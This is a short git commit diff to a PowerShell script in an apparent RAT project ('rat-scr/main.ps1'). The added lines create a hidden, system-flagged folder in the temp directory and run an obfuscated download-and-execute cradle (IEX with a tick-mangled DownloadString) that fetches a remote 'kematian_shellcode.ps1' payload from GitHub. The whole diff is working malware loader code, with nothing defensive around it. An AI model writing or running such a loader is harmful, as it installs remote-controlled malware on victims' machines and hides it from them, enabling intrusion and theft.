f02d18337c7445015d54821a4af2f097204142b8
43a1723 <hai1723notgay@gmail.com>
2024-08-13 16:19:25 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -1,2 +1,9 @@
 $dir = "$env:temp\loader"
+New-Item -ItemType Directory -Path $dir
+attrib +h +s $dir
 cd $dir
+Set-Location -Path $dir
+
+$shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
